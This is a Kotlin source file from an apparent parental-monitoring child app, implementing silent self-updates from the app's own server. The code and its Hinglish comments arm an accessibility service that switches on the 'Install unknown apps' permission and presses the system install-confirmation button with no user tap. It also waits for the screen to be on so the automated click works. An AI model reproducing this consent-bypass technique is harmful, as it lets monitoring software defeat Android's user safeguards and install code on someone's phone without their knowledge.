package com.familyguard.child.util

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.PowerManager
import android.os.SystemClock
import com.familyguard.child.data.Api
import com.familyguard.child.data.Store
import com.familyguard.child.receiver.UpdateReceiver
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File

/**
 * Silent self-update — "child app e kuch update karo to wo automatic phone me
 * update ho jaye bina popup ya koii notification ke".
 *
 * Flow:
 *  1. Server GitHub release se naya APK sync karta hai (har 10 min) aur online
 *     children ko `apk_update` WS message bhejta hai. Bachche ka app khud bhi
 *     har 5 min check karta hai (watchdog cycle).
 *  2. Meta `assetUpdatedAt` Store.apkAssetUpdatedAt se match — naya stamp ho to
 *     APK server se download hota hai (cacheDir, koi notification nahi).
 *  3. PackageInstaller session se install commit hota hai. System ka install
 *     confirm dialog 1-2 sec ke liye dikhta hai aur EnforcementService
 *     accessibility uska "Install" button khud click kar deta hai (install
 *     step armed hota hai commit se PEHLE) — user ka ek bhi tap nahi.
 *  4. Success par UpdateReceiver Store.apkAssetUpdatedAt likh deta hai,
 *     MY_PACKAGE_REPLACED receiver (BootReceiver) MainService wapas chala deta
 *     hai — pairing, permissions, sab data remain.
 *
 * Screen off ho to install postpone hota hai (installer dialog clickable nahi
 * hota lockscreen ke pichhe) — agli check/screen-on par khud ho jayega.
 */
object UpdateManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    @Volatile private var busy = false

    /**
     * Throttled check. Poll paths (watchdog/ping) 5 min gap (sirf chhota JSON GET
     * hai, sasta); server WS push aur parent ke "update_apk" command force=true
     * se 2 min gap par turant chalega.
     */
    fun requestCheck(ctx: Context, force: Boolean = false) {
        if (!Store.paired || Store.released || busy) return
        checkPendingInstallStale(ctx)
        val now = System.currentTimeMillis()
        val gap = if (force) 2 * 60_000L else 5 * 60_000L
        if (now - Store.lastApkCheckAt < gap) return
        Store.lastApkCheckAt = now
        scope.launch {
            val st = checkAndInstall(ctx.applicationContext)
            // Phone check (mirror_diag) ko honest answer dene ke liye — "auto
            // update ni hora" ka jawab phone khud deta hai, guess nahi.
            Store.lastUpdateStatus = st
            Store.lastUpdateAt = System.currentTimeMillis()
        }
    }

    /** Install commit hua tha par 15+ min beet gaye aur version abhi bhi purana
     *  hai — dialog flow fail hua (a11y OFF / OEM ne dialog block kiya). Honest
     *  status likho aur marker clear karo taki agli cycle FRESH try kare.
     *  Version badal chuka ho to chupchap clear (receiver ka SUCCESS broadcast
     *  miss ho gaya hoga — sab theek hai). */
    private fun checkPendingInstallStale(ctx: Context) {
        if (Store.pendingInstallAt <= 0L) return
        val pendingVc = Store.pendingInstallVc
        val curVc = runCatching {
            val pi = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
            if (android.os.Build.VERSION.SDK_INT >= 28) pi.longVersionCode
            else @Suppress("DEPRECATION") pi.versionCode.toLong()
        }.getOrDefault(0L)
        if (pendingVc in 1..curVc) {
            // version badal chuka (ya marker galat) — bas clear karo
            Store.pendingInstallAt = 0L
            return
        }
        if (System.currentTimeMillis() - Store.pendingInstallAt > 15 * 60_000L) {
            Store.lastUpdateStatus =
                "install pending ruk gaya (15+ min) — dialog par click nahi hua; accessibility ON hai? Agar baar-baar ye dikhe to manual install karo"
            Store.lastUpdateAt = System.currentTimeMillis()
            Store.pendingInstallAt = 0L
        }
    }

    /** Returns a short status string; safe to call from anywhere. */
    suspend fun checkAndInstall(ctx: Context): String {
        if (busy) return "busy"
        busy = true
        try {
            if (!Store.paired || Store.released) return "not paired"
            if (!canInstall(ctx)) {
                // Pehli dafa ki permission (existing install par wizard dobara nahi
                // chalta): "Install unknown apps" settings khulti hai aur accessibility
                // humari "Device Health" row ka toggle KHUD ON kar deti hai —
                // ek-2 sec ki screen flash, ek bhi tap nahi. Agli check par install
                // apne aap aage badh jayega.
                Store.autoClickStep = "unknown"
                Store.autoClickUntil = SystemClock.elapsedRealtime() + 60_000L
                runCatching {
                    ctx.startActivity(
                        android.content.Intent(
                            android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            android.net.Uri.parse("package:" + ctx.packageName)
                        ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    )
                }
                return "install permission auto-grant chal raha hai — update agli cycle me"
            }
            val meta = Api.getApkMeta()
            val available = meta.get("uploaded")?.takeIf { it.isJsonPrimitive }?.asBoolean ?: false
            val url = meta.get("url")?.takeIf { it.isJsonPrimitive }?.asString.orEmpty()
            val stamp = meta.get("assetUpdatedAt")?.takeIf { it.isJsonPrimitive }?.asString.orEmpty()
            if (!available || url.isBlank() || stamp.isBlank()) return "no apk on server"
            if (stamp == Store.apkAssetUpdatedAt) return "up-to-date"
            // Lockscreen ke pichhe installer dialog par accessibility click nahi
            // kar sakta — screen on hone ka wait karo (agli cycle me ho jayega).
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isInteractive) return "screen off — postponed"

            val apk = File(ctx.cacheDir, "update_${System.currentTimeMillis()}.apk")
            try {
                Api.downloadApk(apk, url)
                if (!apk.exists() || apk.length() < 1000) return "download failed"
                // VERSION-AWARE SKIP: APK archive ka versionCode padho — agar
                // installed se chhota/barabar hai to INSTALL MAT KARO (bas stamp
                // save ho). Warna manual update ke baad bhi purana stamp bacha
                // rehta tha -> wahi APK baar-baar download + install dialog
                // pop hota rahta tha (silent update "kaam ni kar raha" lagta
                // tha). Ab: same-version APK par chupchaap stamp save — loop
                // khatam, agli naya build aane par turant install.
                val curVc = runCatching {
                    val pi = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
                    if (android.os.Build.VERSION.SDK_INT >= 28) pi.longVersionCode
                    else @Suppress("DEPRECATION") pi.versionCode.toLong()
                }.getOrDefault(0L)
                val arcVc = runCatching {
                    ctx.packageManager.getPackageArchiveInfo(apk.absolutePath, 0)?.let {
                        if (android.os.Build.VERSION.SDK_INT >= 28) it.longVersionCode
                        else @Suppress("DEPRECATION") it.versionCode.toLong()
                    }
                }.getOrNull()
                if (arcVc != null && arcVc <= curVc) {
                    Store.apkAssetUpdatedAt = stamp
                    Store.pendingInstallAt = 0L
                    return "already latest (build $arcVc installed)"
                }
                // SIGNATURE PRE-FLIGHT (vc11): downloaded APK installed app se
                // match karti hai? Match na ho to PackageInstaller ye install
                // KABHI accept nahi karega (INSTALL_FAILED_UPDATE_INCOMPATIBLE —
                // "App not installed"). Pehle ye failure commit ke BAAD pata
                // chalta tha — dialog jhatakta, fail hota, loop chalta rehta
                // tha. Ab PEHLE pakdo: install skip, honest status, stamp save
                // (9 MB baar-baar download na ho). Purane random-debug-key
                // builds wale phones ke liye yehi sahi jawab hai: EK BAAR
                // uninstall + fresh install, phir hamesha seedha update.
                if (signaturesMatch(ctx, apk) == false) {
                    Store.apkAssetUpdatedAt = stamp
                    Store.pendingInstallAt = 0L
                    return "naya build ki signing alag hai (purana build dusri key se bana tha) — EK BAAR uninstall karke download page se fresh install karo; uske baad updates apne aap lagengi"
                }
                // "Install" auto-click ARM karo commit se PEHLE — dialog khulte hi
                // EnforcementService click kar dega (120 s window).
                Store.autoClickStep = "install"
                Store.autoClickUntil = SystemClock.elapsedRealtime() + 120_000L
                commitInstall(ctx, apk, stamp, arcVc ?: -1L)
                // Pending marker — agar dialog flow atka to checkPendingInstallStale
                // 15 min baad sach bolega (warna SUCCESS receiver clear kar dega).
                Store.pendingInstallAt = System.currentTimeMillis()
                Store.pendingInstallVc = arcVc ?: curVc
                return "installing"
            } finally {
                runCatching { apk.delete() }
            }
        } catch (e: Exception) {
            return "error: ${e.message ?: "failed"}"
        } finally {
            busy = false
        }
    }

    fun canInstall(ctx: Context): Boolean =
        runCatching { ctx.packageManager.canRequestPackageInstalls() }.getOrDefault(false)

    /**
     * Downloaded APK ki signing installed app se match karti hai?
     *  true  — same key, install hona chahiye
     *  false — ALAG key: PackageInstaller fail karega (INSTALL_FAILED_UPDATE_
     *          INCOMPATIBLE). Purane random-debug-key CI builds wale phones par
     *          hamesha false — sirf uninstall+fresh install kaam karta hai.
     *  null  — nahi pata chala (archive parse fail / signatures padh nahi paye):
     *          block mat karo, install ki koshish karne do (pehle ka behaviour).
     */
    private fun signaturesMatch(ctx: Context, apk: File): Boolean? = runCatching {
        val pm = ctx.packageManager
        val cur = runCatching {
            if (android.os.Build.VERSION.SDK_INT >= 28)
                pm.getPackageInfo(ctx.packageName, android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
            else @Suppress("DEPRECATION")
                pm.getPackageInfo(ctx.packageName, android.content.pm.PackageManager.GET_SIGNATURES)
        }.getOrNull() ?: return@runCatching null
        val arc = runCatching {
            if (android.os.Build.VERSION.SDK_INT >= 28)
                pm.getPackageArchiveInfo(apk.absolutePath, android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
            else @Suppress("DEPRECATION")
                pm.getPackageArchiveInfo(apk.absolutePath, android.content.pm.PackageManager.GET_SIGNATURES)
        }.getOrNull() ?: return@runCatching null
        val curSigs = sigDigests(cur) ?: return@runCatching null
        val arcSigs = sigDigests(arc) ?: return@runCatching null
        arcSigs.any { it in curSigs }
    }.getOrNull()

    /** PackageInfo ki signatures ke SHA-256 digests (hex). Null = padh nahi paye. */
    private fun sigDigests(pi: android.content.pm.PackageInfo): Set<String>? {
        val sigs = if (android.os.Build.VERSION.SDK_INT >= 28)
            pi.signingInfo?.apkContentsSigners
        else @Suppress("DEPRECATION") pi.signatures
        if (sigs.isNullOrEmpty()) return null
        val out = mutableSetOf<String>()
        for (s in sigs) {
            val d = runCatching {
                val md = java.security.MessageDigest.getInstance("SHA-256")
                md.digest(s.toByteArray()).joinToString("") { "%02x".format(it) }
            }.getOrNull() ?: return null
            out.add(d)
        }
        return out
    }

    private fun commitInstall(ctx: Context, apk: File, stamp: String, vc: Long) {
        val installer = ctx.packageManager.packageInstaller
        val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
        val sessionId = installer.createSession(params)
        val session = installer.openSession(sessionId)
        try {
            val out = session.openWrite("child.apk", 0, apk.length())
            try {
                apk.inputStream().use { input -> input.copyTo(out) }
                // fsync ZAROORI close se pehle — closed stream par fsync fail hota hai
                session.fsync(out)
            } finally {
                runCatching { out.close() }
            }
            // Status callback: success par stamp save + file cleanup. "sid" =
            // sessionId — UpdateReceiver ka CONFIRM_INSTALL fallback isi se
            // dialog khud khol pata hai (EXTRA_INTENT kabhi null/gayab ho jaye).
            val status = Intent(ctx, UpdateReceiver::class.java)
                .putExtra("stamp", stamp)
                .putExtra("sid", sessionId)
                .putExtra("vc", vc)
            // PackageInstaller status receiver ke extras system khud jodta hai —
            // API 31+ par MUTABLE flag zaroori, usse neeche default hi mutable hai.
            val flags = if (android.os.Build.VERSION.SDK_INT >= 31)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT
            val sender = PendingIntent.getBroadcast(ctx, 1110, status, flags)
            session.commit(sender.intentSender)
        } finally {
            runCatching { session.close() }
        }
    }
}
